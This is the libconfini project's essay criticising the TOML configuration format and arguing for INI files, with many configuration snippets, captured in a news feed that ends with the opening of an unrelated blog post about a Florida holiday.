<p>TOML's syntax is documented at <a href="https://toml.io/en/v1.0.0" rel="nofollow">https://toml.io/en/v1.0.0</a> (at the time of writing its current revision is <a href="https://github.com/toml-lang/toml/tree/8296d6ba97aaaf3151a32a22ed0513301ac650bf">r793.8296d6b</a>). The following paragraphs explain why you might want to avoid TOML for your next configuration file for a C or a C++ application.</p>
<p>Writing a harsh critique of someone else's efforts is never a pleasant task. But it might be a necessary task when these efforts go in the wrong direction. It is possible that at some point TOML designers will fix the issues listed below. If they will do so, they will finally end up re-inventing INI files.</p>
<h2 id="user-content-1-data-types"><a href="#1-data-types">1. Data types</a></h2>
<p>A TOML document syntactically <em>defines</em> data types. This means that writing <code>89</code> and writing <code>"89"</code> are two different things (the first is a number, the second is a string). And this also means that a compliant TOML parser <em>must</em> respond to type changes in a TOML document. Today you write <code>"89"</code>, your application receives a string and everything goes well, but tomorrow you write <code>89</code> and your application <em>must</em> receive a number…</p>
<p>…and crash.</p>
<p>Of course no application would let anyone do that. Any judicious application using TOML for its configuration will be either tolerant towards improper data types, or will be obstinate and refuse type changes. In the first scenario you will have a non-compliant TOML parser (basically an INI parser), in the second scenario you will have a parser slightly more stupid than an INI parser and still non-compliant (it will not allow a TOML document to define a data type). The question is then: why giving the configuration file the power to speak about data types when at the end of the day it does not have this power (the application does)? The whole thing sounds like “You decide. No, wait, I decide.”</p>
<p>In INI files everything is <em>a castable string</em>. It means that an application always receives a string, and such string is always able to produce a boolean, a number, a simple string, or <em>an array of castable strings</em>, without generating errors. But the application decides what to pick up and how to react to it, not the configuration file. If you want to tell the human about it, write it in a comment, but don't give the configuration file the illusion of a power it does not possess.</p>
<h2 id="user-content-2-quotes-in-values"><a href="#2-quotes-in-values">2. Quotes in values</a></h2>
<p>There is also a deeper issue with data types. Imagine the following configuration file:</p>
<div data-snippet-clipboard-copy-content="[server]
continent = Europe"><pre><code>[server]
continent = Europe
</code></pre></div>
<p>The value above is not required to be a string, it is required to be <em>a continent name</em>. Writing</p>
<div data-snippet-clipboard-copy-content="[server]
continent = 1009"><pre><code>[server]
continent = 1009
</code></pre></div>
<p>is not worse than writing</p>
<div data-snippet-clipboard-copy-content="[server]
continent = &quot;Vacuum cleaner&quot;"><pre><code>[server]
continent = "Vacuum cleaner"
</code></pre></div>
<p>There is no award to gain in demanding that a value avoid a syntax that for some reason is reserved for numbers when it must not be a lot of other things either. And it does not make much sense to create a “string data type” when a “continent name data type” would be required – once again: <em>the <code>continent</code> key above does not expect a string, it expects a continent name</em> (which is not a string more than the ASCII characters used to express numbers are).</p>
<p>Instead, without any valid reason, TOML's syntax forces humans to encapsulate anything that is not a number, a boolean or a date in quotes, disregarding the fact that this would incorrectly present <code>Europe</code> as a string (it is an enumeration label to be exact – in configuration files most values tend to be enumeration labels of some sort) and despite humans would not need quotes for understanding when a sequence of characters – like <code>poet</code> – is not a boolean, or a number, or a date – as for the machines, that would not be a hard task either.</p>
<div data-snippet-clipboard-copy-content="[shakespeare]
birth = 1564
death = 1616

# invalid in TOML
job = poet"><pre><code>[shakespeare]
birth = 1564
death = 1616

# invalid in TOML
job = poet
</code></pre></div>
<p>It is probably not a coincidence that one of the first things that <a href="http://hjson.org/" rel="nofollow">the Hjson project</a> did in order to create a dialect of JSON “easy for humans to read and write” was to remove the necessity of using quotes for declaring strings.</p>
<p>TOML's creator claims that unquoted strings are inherently ambiguous. We can try to imagine the following scenario,</p>

<p>where the quotes seem to suggest that also <code>"252.1"</code> (i.e. a string) would be a valid value for the <code>version</code> key. But do they? What about?</p>
<div data-snippet-clipboard-copy-content="version = &quot;252_1%2!3?4-5/6=7&quot;"><pre><code>version = "252_1%2!3?4-5/6=7"
</code></pre></div>
<p>Would that be a valid version string? What other information does quoting <code>252</code> give except that there could also be “something else” than a simple number?</p>
<p>Without a comment that explains exactly how to format the <code>version</code> key there is just no way to make it unambiguous, quotes or not.</p>
<div data-snippet-clipboard-copy-content="#INI

# Please use MAJOR(.MINOR(.REVISION)) here
version = 252.1.0"><pre><code>#INI

# Please use MAJOR(.MINOR(.REVISION)) here
version = 252.1.0
</code></pre></div>
<p>As in a language that has an extensible semantics, in INI files quotes serve the simple purpose of giving hints, expressing literalness, or removing <em>syntactic</em> (not semantic) ambiguity when there is the risk of it, exactly like a human would do. For instance, an INI file would use quotes like the following example does, for indicating that the <code>#</code> character in <code>#fff000</code> does not mark a comment.</p>

<h2 id="user-content-3-case-sensitivity"><a href="#3-case-sensitivity">3. Case sensitivity</a></h2>
<p>TOML's syntax is always case-sensitive, despite the fact that there are situations where a configuration file <em>must</em> be case-insensitive (think of configuration files that map a FAT32 filesystem or HTML tags, for example). INI formats can be either case-sensitive or case-insensitive depending on the application's choice.</p>
<h2 id="user-content-4-unicode-key-names"><a href="#4-unicode-key-names">4. Unicode key names</a></h2>
<p>TOML's syntax forbids non-ASCII key names unless these are surrounded by quotes.</p>
<div data-snippet-clipboard-copy-content="value in € = 345    # valid with libconfini but invalid in TOML"><pre><code>value in € = 345    # valid with libconfini but invalid in TOML
</code></pre></div>
<p>There is no apparent motivation behind this rule, except that of conforming TOML to JSON, and probably a personal habit in dealing with the latter. But although JSON <em>does</em> have a valid reason to do so because of the programming language it has been designed to work with (ECMAScript property names follow the same rule of identifiers), TOML's reason remains somewhat mysterious.</p>
<h2 id="user-content-5-square-brackets"><a href="#5-square-brackets">5. Square brackets</a></h2>
<p>TOML forces arrays to be encapsulated within square brackets (exactly like section paths do), although humans do not need square brackets for recognizing when something is a list.</p>
<div data-snippet-clipboard-copy-content="# not an array in TOML
wishes = apples, cars, elephants, chairs"><pre><code># not an array in TOML
wishes = apples, cars, elephants, chairs
</code></pre></div>
<p>Nested arrays are also not a valid reason for justifying square brackets, since in INI files it is already possible to nest arrays either by using different delimiters for each level,</p>
<div data-snippet-clipboard-copy-content="wishes = \
    apples : oranges : lemons, \
    cars, \
    elephants : tigers, \
    chairs"><pre><code>wishes = \
    apples : oranges : lemons, \
    cars, \
    elephants : tigers, \
    chairs
</code></pre></div>
<p>or by recursively quoting.</p>
<div data-snippet-clipboard-copy-content="wishes = \
    &quot;apples oranges lemons&quot; \
    cars \
    &quot;elephants tigers&quot; \
    chairs"><pre><code>wishes = \
    "apples oranges lemons" \
    cars \
    "elephants tigers" \
    chairs
</code></pre></div>
<p>But there is a more important reason why square brackets are a bad idea in a human-friendly configuration format: one-member arrays. There is no way to convince a human that something composed of only one member is a list (if you think differently, chances are that you are partly non-human). As friendly as they are, INI files behave accordingly, while TOML of course doesn't. Compare this (INI):</p>

<p>with this (TOML):</p>

<p>As in the C language, in INI files <em>a one-member array and a simple value are stored in the same way</em>. Of course you can declare a one-member array in INI files: just write a simple string.</p>
<p>Thanks to this, INI arrays do not constitute a syntactically distinct type and any string can be parsed as an array. If you have ever dealt with m4 macro arguments you will know the beauty of this.</p>
<h2 id="user-content-6-array-delimiters"><a href="#6-array-delimiters">6. Array delimiters</a></h2>
<p>TOML forces arrays to be always comma-separated, although a human can recognize a list even when the separator is a mushroom.</p>
<div data-snippet-clipboard-copy-content="[Super Mario]
wishes = jumping 🍄 sneaking into pipes 🍄 princess Peach 🍄 flying
coins = 39586235"><pre><code>[Super Mario]
wishes = jumping 🍄 sneaking into pipes 🍄 princess Peach 🍄 flying
coins = 39586235
</code></pre></div>
<p><strong>libconfini</strong> does not allow mushrooms either – but for practical, not philosophical reasons (and the library is not human yet) – but you are free to choose any character within the ASCII range as array delimiter and change it as often as you wish. For instance, in an INI file where normally arrays are comma-separated you might decide that an IP address is also an array, but whose members are separated by dots instead of commas – and just because that is what an IP address actually is, and that might be what your application needs.</p>
<h2 id="user-content-7-mixed-arrays"><a href="#7-mixed-arrays">7. Mixed arrays</a></h2>
<p>TOML encourages a nightmare for strongly typed languages like C and C++: mixed arrays. In short, after deciding that a configuration file must express strong types (and nevertheless still allowing <code>"Vacuum cleaner"</code> as a continent name), TOML forces applications to be able to mix them and display some kind of support for something that is natively not supported.</p>
<p>An array that mixes numbers, strings and other arrays is something a C or C++ application would escape from. Although it is possible to reach the same result also with INI, with both TOML and INI a mixed array can be just emulated, <em>never really implemented</em> from the C perspective (we have left an example under <code>examples/miscellanea/toml-like.c</code>, and we would discourage anyone from doing it). The difference between INI and TOML? INI syntax has <em>the power to express</em> mixed arrays but does not require applications to map them as such, TOML does.</p>
<h2 id="user-content-8-composite-configuration-files"><a href="#8-composite-configuration-files">8. Composite configuration files</a></h2>
<p>TOML's syntax forbids to populate sections in different steps (sections are named “tables” in TOML). The following example, understood by a human and an INI parser, would be forbidden in TOML:</p>
<div data-snippet-clipboard-copy-content="[visitors]
list = karl, lisa, Andrew Smith, rick92

[host]
foo = bar

[visitors]          # invalid in TOML
checked = true      # invalid in TOML"><pre><code>[visitors]
list = karl, lisa, Andrew Smith, rick92

[host]
foo = bar

[visitors]          # invalid in TOML
checked = true      # invalid in TOML
</code></pre></div>
<p>Although this might look like an insignificant detail, allowing to populate a configuration file in different steps can come very much in handy when dealing with the composition of several smaller configuration files.</p>
<h2 id="user-content-9-dates"><a href="#9-dates">9. Dates</a></h2>
<p>This is probably the most mysterious part of TOML language. In INI files a value can be <em>interpreted</em> as a boolean, a number, a string, an array, or whatever else you like (although in this last case <strong>libconfini</strong> will not help you). The situation is kind of similar in TOML (without the “whatever else you like” part), except that a value can also be <em>a date</em>.</p>
<p>There is something intriguing in all this. Even forgetting that an application might not need dates at all, why constraining something so particular and that can be formatted in so many different ways into a rigid primitive? Why not doing that for <em>a path</em>? Or <em>a username</em>? Or <em>an email address</em>? Or <em>a regular expression</em>? …Or <em>a continent name</em>? These have all a more constraining semantics than dates.</p>
<p>In INI files a date is either a time stamp or a human-friendly string.</p>
<div data-snippet-clipboard-copy-content="date = &quot;Thu, 30 Aug 2012 12:31:00 GMT&quot;"><pre><code>date = "Thu, 30 Aug 2012 12:31:00 GMT"
</code></pre></div>
<h2 id="user-content-10--empty-key-names"><a href="#10--empty-key-names">10.  Empty key names</a></h2>
<p>Although a human would have no idea of what it could possibly mean (and probably a machine would not do any better), TOML's syntax explicitly allows (but discourages) to assign values to empty key names.</p>
<div data-snippet-clipboard-copy-content="&quot;&quot; = &quot;whatever&quot;     # valid in TOML
'' = 'whatever'     # valid in TOML
= 'whatever'        # invalid in TOML (seriously?)"><pre><code>"" = "whatever"     # valid in TOML
'' = 'whatever'     # valid in TOML
= 'whatever'        # invalid in TOML (seriously?)
</code></pre></div>
<h2 id="user-content-11-arrays-of-tables-aka-arrays-of-sections"><a href="#11-arrays-of-tables-aka-arrays-of-sections">11. Arrays of tables (a.k.a. arrays of sections)</a></h2>
<p>Sometimes what initially appears to be a nice invention can end up being the opposite – yes, this can happen too. We are talking about arrays of tables here (a.k.a. arrays of sections).</p>
<p>Arrays of tables are declared in TOML using the double square bracket notation:</p>
<div data-snippet-clipboard-copy-content="# TOML

[[server]]
ip = &quot;214.252.11.145&quot;
country = &quot;Australia&quot;

[[server]]
ip = &quot;214.252.11.146&quot;
country = &quot;India&quot;

[[server]]
ip = &quot;214.252.11.147&quot;
country = &quot;Sweden&quot;

..."><pre><code># TOML

[[server]]
ip = "214.252.11.145"
country = "Australia"

[[server]]
ip = "214.252.11.146"
country = "India"

[[server]]
ip = "214.252.11.147"
country = "Sweden"

...
</code></pre></div>
<p>Strictly speaking, arrays of tables introduce the concept of “unnamed tables” – <code>server</code> in the example above is not the name of a table, it is the name of <em>a collection of tables, each of which does not have a name</em>. But independently of the syntactical consequences, this feature carries a major problem: it encourages using configuration files as databases.</p>
<p>The common way to deal with similar scenarios in INI files would be that of keeping a common parent section – so that the application can scroll blindly through the sibling subsections – and making the nesting explicit by giving each subsection a name (in fact, the only unnamed section in INI files can be the document's root):</p>
<div data-snippet-clipboard-copy-content="# INI

[server.main]
ip = 214.252.11.145
country = Australia

[server.secondary]
ip = 214.252.11.146
country = India

[server.broken]
ip = 214.252.11.147
country = Sweden

# You can add an infinite number of `server.*` subsections here and use
# arbitrary names, the application will retrieve all of them."><pre><code># INI

[server.main]
ip = 214.252.11.145
country = Australia

[server.secondary]
ip = 214.252.11.146
country = India

[server.broken]
ip = 214.252.11.147
country = Sweden

# You can add an infinite number of `server.*` subsections here and use
# arbitrary names, the application will retrieve all of them.
</code></pre></div>
<p>The INI way is inherently more human-readable (humans like descriptive names), and produces the nice outcome that when the entries have become too many, and naming each of them has become too cumbersome, it is the good sign that you should finally switch to a database format and keep your configuration file clean.</p>
<p>Even <a href="https://github.com/toml-lang/toml/blob/8296d6ba97aaaf3151a32a22ed0513301ac650bf/README.md#Example">TOML's featured example</a> proposes “the INI way”</p>
<div data-snippet-clipboard-copy-content="[servers.alpha]
ip = &quot;10.0.0.1&quot;
role = &quot;frontend&quot;

[servers.beta]
ip = &quot;10.0.0.2&quot;
role = &quot;backend&quot;"><pre><code>[servers.alpha]
ip = "10.0.0.1"
role = "frontend"

[servers.beta]
ip = "10.0.0.2"
role = "backend"
</code></pre></div>
<p>instead of “the TOML way”</p>
<div data-snippet-clipboard-copy-content="[[servers]]
ip = &quot;10.0.0.1&quot;
role = &quot;frontend&quot;

[[servers]]
ip = &quot;10.0.0.2&quot;
role = &quot;backend&quot;"><pre><code>[[servers]]
ip = "10.0.0.1"
role = "frontend"

[[servers]]
ip = "10.0.0.2"
role = "backend"
</code></pre></div>
<p>for presenting the language.</p>
<p>But if this does not convince you, and at the end of the day you really want to play dirty with your configuration files, INI sill offers you its quirks to reach TOML's effect, without the inconvenience of introducing anonymous sections:</p>
<div data-snippet-clipboard-copy-content="# INI

[server.&quot;214.252.11.145&quot;]
country = Australia

[server.&quot;214.252.11.146&quot;]
country = India

[server.&quot;214.252.11.147&quot;]
country = Sweden

..."><pre><code># INI

[server."214.252.11.145"]
country = Australia

[server."214.252.11.146"]
country = India

[server."214.252.11.147"]
country = Sweden

...
</code></pre></div>
<p>It goes without saying that you should not follow TOML in this. INI is not a database format; it targets primarily humans, not machines. If you want to store multiple sections of the same kind, please give them human-friendly names, and have fun.</p>
<h2 id="user-content-12-lack-of-support-for-implicit-keys"><a href="#12-lack-of-support-for-implicit-keys">12. Lack of support for implicit keys</a></h2>
<p>Serialization formats often have shortcuts for expressing a <code>true</code> boolean implicitly. A bare HTML attribute, for instance, is automatically given the <code>"true"</code> value – i.e. the <code>contenteditable</code> attribute in the following example is automatically parsed as <code>contenteditable="true"</code>.</p>
<div data-snippet-clipboard-copy-content="<div contenteditable class=&quot;my-class&quot;></div>"><pre><code>&lt;div contenteditable class="my-class"&gt;&lt;/div&gt;
</code></pre></div>
<p>Similarly, in the following INI fragment from <code>/etc/pacman.conf</code> (<strong>Arch</strong>), <code>Color</code> is an implicit key representing a <code>true</code> boolean – i.e. <code>Color = YES</code>.</p>
<div data-snippet-clipboard-copy-content="HoldPkg = pacman glibc
Architecture = auto
IgnorePkg =
Color
SigLevel = Required DatabaseOptional
LocalFileSigLevel = Optional"><pre><code>HoldPkg = pacman glibc
Architecture = auto
IgnorePkg =
Color
SigLevel = Required DatabaseOptional
LocalFileSigLevel = Optional
</code></pre></div>
<p>TOML lacks support for implicit keys, and key names not followed by an equals sign always constitute syntax errors.</p>
<h2 id="user-content-13-inline-tables-must-remain-inline"><a href="#13-inline-tables-must-remain-inline">13. Inline tables must remain… inline</a></h2>
<p>In addition to the INI way, TOML introduces a duplicate way of declaring sections: “inline tables”. The following TOML example:</p>
<div data-snippet-clipboard-copy-content="# TOML

homepage = { page_header = &quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.&quot;, page_footer = &quot;Orci varius natoque penatibus et magnis dis parturient montes.&quot; }"><pre><code># TOML

homepage = { page_header = "Lorem ipsum dolor sit amet, consectetur adipiscing elit.", page_footer = "Orci varius natoque penatibus et magnis dis parturient montes." }
</code></pre></div>
<p>is an exact synonym of:</p>
<div data-snippet-clipboard-copy-content="# TOML

[homepage]
page_header = &quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.&quot;
page_footer = &quot;Orci varius natoque penatibus et magnis dis parturient montes.&quot;"><pre><code># TOML

[homepage]
page_header = "Lorem ipsum dolor sit amet, consectetur adipiscing elit."
page_footer = "Orci varius natoque penatibus et magnis dis parturient montes."
</code></pre></div>
<p>Besides the visual inconvenience of presenting entire sections like keys, not much would be wrong with this feature, not even the redundancy, had the feature not come with an ugly rule attached: inline tables must remain inline.</p>
<p>Such a coercion would become tolerable after being reminded that in that language a new line is supposed to end a node, if only there had not been an exception that makes it intolerable: arrays, on the contrary, can span multiple lines.</p>
<p>Thus, you can write,</p>
<div data-snippet-clipboard-copy-content="# TOML

homepage = [
	&quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.&quot;,
	&quot;Orci varius natoque penatibus et magnis dis parturient montes.&quot;
]"><pre><code># TOML

homepage = [
	"Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
	"Orci varius natoque penatibus et magnis dis parturient montes."
]
</code></pre></div>
<p>but you cannot write</p>
<div data-snippet-clipboard-copy-content="# Invalid TOML example

homepage = {
	page_header = &quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.&quot;,
	page_footer = &quot;Orci varius natoque penatibus et magnis dis parturient montes.&quot;
}"><pre><code># Invalid TOML example

homepage = {
	page_header = "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
	page_footer = "Orci varius natoque penatibus et magnis dis parturient montes."
}
</code></pre></div>
<p>What makes things worse is the fact that this prohibition exists only for the sake of not having two ways of declaring tables that are both multi-line. It is “a moral prohibition”, not dictated by any practical reasons. In short, it exists only for telling you how to behave.</p>
<p>TOML's designers insist saying that allowing multi-line tables declared in this way would break one of TOML's pillars, which is precisely that of terminating a node when a (non-escaped) new line is found. But that is one of INI's pillars, not TOML's: TOML had already betrayed this principle after establishing its array syntax. Looking at the asymmetry above from a different perspective, one could indeed say that the original mistake lies with arrays, not with inline tables (but however one puts it, a mistake lies somewhere).</p>
<p>It is possible to argue further that inline tables bring TOML's syntax closer to JSON. That alone is a good reason to be happy that inline tables are alien in INI files.</p>
<h2 id="user-content-14-incompatibility"><a href="#14-incompatibility">14. Incompatibility</a></h2>
<p>By design TOML is explicitly incompatible with about fourty years of configuration files.</p>
<h2 id="user-content-15-immediacy"><a href="#15-immediacy">15. Immediacy</a></h2>
<p>A configuration file is meant to be edited by a human – possibly someone who has only <strong>Microsoft Notepad</strong> as text editor and has never heard of TOML or INI before – and editing it should feel like a natural and welcomed thing to do, not like hacking a program source code, especially if this does not give any expressive advantage.</p>
<p>If a person who has never heard of TOML sees the following configuration file,</p>
<div data-snippet-clipboard-copy-content="# TOML

[&quot;bank&quot;]
&quot;ip&quot; = &quot;192.168.1.1&quot;
&quot;square root&quot; = 15000

[&quot;client&quot;]
&quot;hello world&quot; = [&quot;sunny&quot;]
&quot;foo&quot; = &quot;9234&quot;"><pre><code># TOML

["bank"]
"ip" = "192.168.1.1"
"square root" = 15000

["client"]
"hello world" = ["sunny"]
"foo" = "9234"
</code></pre></div>
<p>how is the person supposed to know that <code>"ip"</code> can be written also without quotes, but that is not the case of <code>"square root"</code>, as this contains spaces and keys containing spaces must be always quoted? or that the string <code>["sunny"]</code> is not a reference to a section name but is an array instead? or what data types a particular array can contain?</p>
<p>INI, on the other hand, encourages human-friendly comments for explaining what is not immediately visible.</p>
<div data-snippet-clipboard-copy-content="# INI

[bank]
ip = 192.168.1.1
square root = 15000

[client]
hello world = sunny  # it is possible to write a comma-separated list here
foo = 9234"><pre><code># INI

[bank]
ip = 192.168.1.1
square root = 15000

[client]
hello world = sunny  # it is possible to write a comma-separated list here
foo = 9234
</code></pre></div>
<p>You can write comments in TOML as well, of course. But the risk is that they end up being lists of things to avoid that have nothing to do with the application you are configuring, rather than suggestions of what is possible to do.</p>
<div data-snippet-clipboard-copy-content="# TOML

[&quot;bank&quot;]
&quot;ip&quot; = &quot;192.168.1.1&quot;    # you can remove the quotes from `&quot;ip&quot;` if you want
&quot;square root&quot; = 15000   # do not remove the quotes from `&quot;square root&quot;`, TOML forbids it

[&quot;client&quot;]
&quot;hello world&quot; = [&quot;sunny&quot;]   # `[&quot;sunny&quot;]` is not a section name
&quot;foo&quot; = &quot;9234&quot;  # do not remove the quotes from `&quot;9234&quot;`, it is not a number (I know...)"><pre><code># TOML

["bank"]
"ip" = "192.168.1.1"    # you can remove the quotes from `"ip"` if you want
"square root" = 15000   # do not remove the quotes from `"square root"`, TOML forbids it

["client"]
"hello world" = ["sunny"]   # `["sunny"]` is not a section name
"foo" = "9234"  # do not remove the quotes from `"9234"`, it is not a number (I know...)
</code></pre></div>
<h2 id="user-content-16-genesis"><a href="#16-genesis">16. Genesis</a></h2>
<p>Configuration files are born out of necessity, and different applications can have different requirements. There are cases where a configuration file differs substantially from the INI format. It is not rare in these situations that developers have ended up abandoning a widespread and solid configuration format such as INI only after realizing that they had no other choice and not without pain.</p>
<p>In this respect, the way <strong>libconfini</strong> was born is paradigmatic. It was born for an application – an editor – and that application had a very peculiar task: read different types of INI files written in the real world for the applications typically installed on a <strong>GNU/Linux</strong> distribution. What a better scenario for creating a parser?</p>
<p>The genesis of TOML instead is quite different. Someone without a parser <a href="https://github.com/toml-lang/toml/issues/411#issuecomment-219203431">decided that unquoted strings in INI files <em>are ugly</em> and forbad them</a>. A lot of rules have then been added afterwards on paper, without really thinking of any real case usage and only keeping JSON as a reference point.</p>
<p>In the beginning it was still only a specification. Many people, enthusiastic finally to read <em>a specification of something somewhere</em>, started to create their own parser for the newborn language. And that was the moment when problems began to appear.</p>
<p>When you write a parser you might indeed begin to notice contradictions in an apparently unflawed rule, your code might start to become unnecessarily complex because of absurd edge cases, and you might realize that the language you are trying to parse is not that well-designed after all.</p>
<p>And even if you do survive the process of writing a parser that is fully compliant with TOML (<a href="https://github.com/avakar/pytoml/issues/15#issuecomment-217739462">some people don't</a>), you still have done only half of the job, that of writing a parser, without really thinking of any real case usage. It is still possible that you have completely wasted your time after all.</p>
<p>There are of course cases where TOML works just fine, and these are the cases where JSON would also work fine (although one has always to tolerate TOML's idea to introduce a syntax for dates). But where JSON works fine, also other JSON dialects more human-friendly than TOML do.</p>
<h2 id="user-content-17-against-postels-law-by-design"><a href="#17-against-postels-law-by-design">17. Against Postel's law by design</a></h2>
<p><a href="https://en.wikipedia.org/wiki/Robustness_principle" rel="nofollow">Postel's law</a> is a good indicator of how robust a language is: the more a language is able to make sense of different types of input, the more robust the language.</p>
<p>In front of a heterogeneous landscape like that of configuration files, a parser that applies Postel's law will try to make sense of the largest possible set of habits and explore all possible solutions to avoid that errors be generated merely because of diversity.</p>
<p>TOML is a good example of a language designed against this principle. <em>The language's founding element was that of generating errors</em> when quotes were missing, and subsequent rules seem to have <em>in generating errors their only reason</em> (think of the requirement of using quotes for key names containing spaces or unicode characters, which has no justification whatsoever – if it is for aesthetical reasons, think that if you were a Chinese speaker you would rather be tempted to use quotes for the Latin characters and leave the Chinese ideograms out of quotes instead).</p>
<p>One would think that a language with such tendencies will always have only one way to express the same thing, at least. And instead no: inline tables were introduced as a duplicate of standard tables, despite being less readable and completely alien in the common practice – something vaguely similar were <a href="http://hyperrealm.github.io/libconfig/" rel="nofollow"><strong>libconfig</strong></a>'s sections, but these spanned multiple lines and constituted the only way to declare sections in that language.</p>
<p>At the end of the day TOML's main goal seems to be that of generating errors. The opposite approach, instead, would be that of taking advantage of diversity and regard it is as a strength.</p>
<h2 id="user-content-18-performance"><a href="#18-performance">18. Performance</a></h2>
<p>It is not so obvious to talk about “TOML's performance”: TOML is a language, not a particular parser. It is possible however to predict that any TOML-compliant parser will be on average <em>much slower</em> than an INI parser.</p>
<p>This entire section is being created while a TOML parser written in C (<a href="https://github.com/cktan/tomlc99"><strong>tomlc99</strong></a>) tries to parse a 50 MiB file that <strong>libconfini</strong> usually parses in half a second – and <strong>libconfini</strong>'s primary goal is not speed (yes, we gave the TOML parser an INI file to parse).</p>
<p>This is not a critique to the particular parser chosen – we can assume that <strong>tomlc99</strong> is doing its best in its hard task. The reason why a TOML parser will always be slow is the error checking fury required by the language. Where most INI parsers' approach will be that of “don't throw an error unless you really cannot make any sense of what is written in a configuration file – the application will do the rest and will do it better”, the approach of a TOML-compliant parser will be that of searching for errors even when both the application and the human would have already understood a content.</p>
<p>After 13 minutes and 20 seconds our TOML parser has finally parsed…</p>
<div data-snippet-clipboard-copy-content="54691749 bytes parsed in 800.849218 seconds.
Number of bytes parsed per second: 68292.192551

ERROR: cannot parse - line 1: extra chars after value"><pre><code>54691749 bytes parsed in 800.849218 seconds.
Number of bytes parsed per second: 68292.192551

ERROR: cannot parse - line 1: extra chars after value
</code></pre></div>
<p>Of course. Someone forgot to put quotes around the first value.</p>
<h2 id="user-content-19-human-friendly-vs-human-readable"><a href="#19-human-friendly-vs-human-readable">19. Human-friendly vs. human-readable</a></h2>
<p>“Human-friendly” and “human-readable” might sound as synonyms, but often they are not. Some texts can be very easy to read but hard to edit.</p>
<p>An inscription on the front of the Pantheon in Rome says “Marcus Agrippa, son of Lucius, made this building when consul for the third time”. This is a very human-readable text if you know a bit of Latin. But in order to edit it you would need a ladder, a chisel and the wish to ruin a millenary monument – please do not try to do it.</p>
<p>An emblematic example of this in file formats is JSON. Due to curly brackets, a systematic indentation and a strict syntax it is probably one of the most human-readable serialization formats. But exactly because of the same reasons it is not the most human-friendly one.</p>
<p>Similarly, if used with a syntax highlighter, the human-readability of TOML is comparable to that of INI. Its human-friendliness, instead, lies a few steps below.</p>
<h2 id="user-content-20-aesthetics"><a href="#20-aesthetics">20. Aesthetics</a></h2>
<p>Appearance has its importance too. TOML's specification comes with <a href="https://github.com/toml-lang/toml/blob/8296d6ba97aaaf3151a32a22ed0513301ac650bf/README.md#Example">the following example</a> for illustrating the language:</p>
<div data-snippet-clipboard-copy-content="# This is a TOML document.

title = &quot;TOML Example&quot;

[owner]
name = &quot;Tom Preston-Werner&quot;
dob = 1979-05-27T07:32:00-08:00 # First class dates

[database]
server = &quot;192.168.1.1&quot;
ports = [ 8000, 8001, 8002 ]
connection_max = 5000
enabled = true

[servers]

  # Indentation (tabs and/or spaces) is allowed but not required
  [servers.alpha]
  ip = &quot;10.0.0.1&quot;
  dc = &quot;eqdc10&quot;

  [servers.beta]
  ip = &quot;10.0.0.2&quot;
  dc = &quot;eqdc10&quot;

[clients]
data = [ [&quot;gamma&quot;, &quot;delta&quot;], [1, 2] ]

# Line breaks are OK when inside arrays
hosts = [
  &quot;alpha&quot;,
  &quot;omega&quot;
]"><pre><code># This is a TOML document.

title = "TOML Example"

[owner]
name = "Tom Preston-Werner"
dob = 1979-05-27T07:32:00-08:00 # First class dates

[database]
server = "192.168.1.1"
ports = [ 8000, 8001, 8002 ]
connection_max = 5000
enabled = true

[servers]

  # Indentation (tabs and/or spaces) is allowed but not required
  [servers.alpha]
  ip = "10.0.0.1"
  dc = "eqdc10"

  [servers.beta]
  ip = "10.0.0.2"
  dc = "eqdc10"

[clients]
data = [ ["gamma", "delta"], [1, 2] ]

# Line breaks are OK when inside arrays
hosts = [
  "alpha",
  "omega"
]
</code></pre></div>
<p>There are many ways of expressing exactly the same content using <strong>libconfini</strong>. The following is probably the most obvious one:</p>
<div data-snippet-clipboard-copy-content="# examples/ini_files/toml-like.conf

# Relax, this is an INI document.


title = INI Example

[owner]
name = madmurphy
dob = &quot;Sun, 27 May 1979 15:32:00 GMT&quot;

[database]
server = 192.168.1.1    # you can parse an IP address as an array too! :-)
ports = 8000, 8001, 8002
connection_max = 5000
enabled

  # Indentation (tabs and/or spaces) is allowed but not required
  [servers.alpha]
  ip = 10.0.0.1
  dc = eqdc10

  [servers.beta]
  ip = 10.0.0.2
  dc = eqdc10

[clients]
data = gamma : delta, 1 : 2

hosts = alpha, omega"><pre><code># examples/ini_files/toml-like.conf

# Relax, this is an INI document.


title = INI Example

[owner]
name = madmurphy
dob = "Sun, 27 May 1979 15:32:00 GMT"

[database]
server = 192.168.1.1    # you can parse an IP address as an array too! :-)
ports = 8000, 8001, 8002
connection_max = 5000
enabled

  # Indentation (tabs and/or spaces) is allowed but not required
  [servers.alpha]
  ip = 10.0.0.1
  dc = eqdc10

  [servers.beta]
  ip = 10.0.0.2
  dc = eqdc10

[clients]
data = gamma : delta, 1 : 2

hosts = alpha, omega
</code></pre></div>
<p>For a parsing example, please have a look at <code>examples/miscellanea/toml-like.c</code>.</p>
<h2 id="user-content-further-readings"><a href="#further-readings">Further readings</a></h2>
<ul>
<li><a href="https://toml.io/en/v1.0.0" rel="nofollow">TOML Specification</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/toml/" rel="nofollow">What is wrong with TOML?</a></li>
</ul>
<h2 id="user-content-state-of-this-document"><a href="#state-of-this-document">State of this document</a></h2>
<p>Last revision: October 2021</p>

              </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ship of Fools (125 pts)]]></title>
            <link>https://successfulsoftware.net/2023/09/19/ship-of-fools/</link>
            <guid>37595322</guid>
            <pubDate>Thu, 21 Sep 2023 09:36:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://successfulsoftware.net/2023/09/19/ship-of-fools/">https://successfulsoftware.net/2023/09/19/ship-of-fools/</a>, See on <a href="https://news.ycombinator.com/item?id=37595322">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
			
<p>I recently had a 3 week holiday in Florida with my family. My 17 year old son is interested in rocketry and my wife is interested in wildlife. We got to see plenty of both and had a great time. There is a lot to like about America and Americans. But the sheer waste of resources on show everywhere was pretty shocking. In Europe we absolutely aren’t doing enough to protect the environment and avert the impending climate catastrophe (I flew to Florida and drove a car there, so I am no environmental saint myself). In Florida they don’t appear to be even trying. </p>



